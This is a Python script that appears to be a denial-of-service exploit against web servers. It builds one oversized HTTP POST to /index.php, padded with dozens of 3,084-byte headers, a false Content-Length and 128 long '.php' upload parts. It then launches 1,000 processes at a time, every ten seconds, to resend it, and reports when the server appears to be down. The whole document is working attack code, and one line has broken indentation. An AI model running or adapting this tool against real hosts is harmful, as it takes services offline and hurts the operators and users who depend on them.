import argparse
import socket
import time
from multiprocessing import Process

def gen_packet(host):
	test = 'POST /index.php HTTP/1.1\r\n'
	test += 'Host: ' + host + '\r\n'
	test += 'User-Agent: Mozila/5.0\r\n'
	test += 'Accept: */*\r\n'
	test += 'Content-Type: multipart/form-data; boundary=---------------------------32917364219558108233580962733\r\n'
	test += 'Connection: keep-alive\r\n'
	test += 'Content-Length: 8122000\r\n'
	test += 'Origin: http://' + 'A' * 3084 + '\r\n'
	for i in range(1,93,1):
		test += 'AdvancedHeaderName' + str(i) + ':' + 'A' *  3084 + '\r\n'
	test += 'Referer: http://' + 'A' * 3084 + '\r\n\r\n'
	for i in range(1,129,1):
		test += '-----------------------------32917364219558108233580962733\r\n'
		test += 'Content-Disposition: form-data; name="user_file_name' + str(i) + '"; filename="' + str(i) + 'A' * 6144 + '.php"\r\n'
		test += 'Content-Type: application/x-php\r\n\r\n'
	return test

def send_packet(host,packet,port):
	try:
		sock1 = socket.socket()
		try:
			sock1.connect((host, port))
		except:
			print ('[!] Connection time out')
		else:
			sock1.send(packet.encode())
			try:
				data1 = sock1.recv(1024).decode()
			except KeyboardInterrupt:
				return 'killed'
			except:
				print ('[+] Server is down')
	except KeyboardInterrupt:
		return 'killed'

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('host', action='store', type=str, help='RHOST to send "bad packets"')
	parser.add_argument('-p', '--port', default="80", action='store', type=int, help='RPORT to send "bad packets"')
	args = parser.parse_args()
	packet=gen_packet(args.host)
	while True:
		try:
			print ('[*] Sending bad http packet')
			for i in range(1000):
				proc = Process(target=send_packet, args=(args.host,packet,args.port,))
				proc.start()
			print ('[*] Timeout')
			time.sleep(10)
	        except KeyboardInterrupt:
			print ('\nExit...')
			exit(0)
